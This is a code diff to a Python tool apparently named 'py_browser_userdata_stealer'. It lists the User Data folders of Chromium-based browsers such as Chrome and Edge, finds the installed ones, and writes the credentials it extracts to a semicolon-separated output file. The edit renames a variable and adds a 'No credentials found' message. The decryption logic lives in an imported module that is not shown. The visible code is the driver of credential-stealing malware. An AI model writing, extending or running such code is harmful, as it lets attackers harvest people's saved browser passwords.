@@ -8,7 +8,7 @@ import textwrap
 from py_browser_userdata_stealer.chromium_based import ChromiumBased
 
 # Chromium based browser's name, User Data path
-chromium_based_list = [
+chromium_browsers = [
     ("Google Chrome", os.path.normpath(os.getenv("LOCALAPPDATA") + 
     "/Google/Chrome/User Data")),
     ("Microsoft Edge", os.path.normpath(os.getenv("LOCALAPPDATA") + 
@@ -24,7 +24,7 @@ def main():
 
     installed_browsers = []
 
-    for name, path in chromium_based_list:
+    for name, path in chromium_browsers:
         if os.path.exists(path):
             browser = ChromiumBased(name, path)
             installed_browsers.append(browser)
@@ -52,7 +52,10 @@ def main():
                     line = ";".join(row)
                     f.write(line + "\n")
                 f.write("\n")
-                print()
+            else:
+                print(wrapper.fill("No credentials found"))
+
+            print()
 
     if os.stat(out_file).st_size != 0:
         print("\nFile \"{}\" has been successfully created".format(out_file))
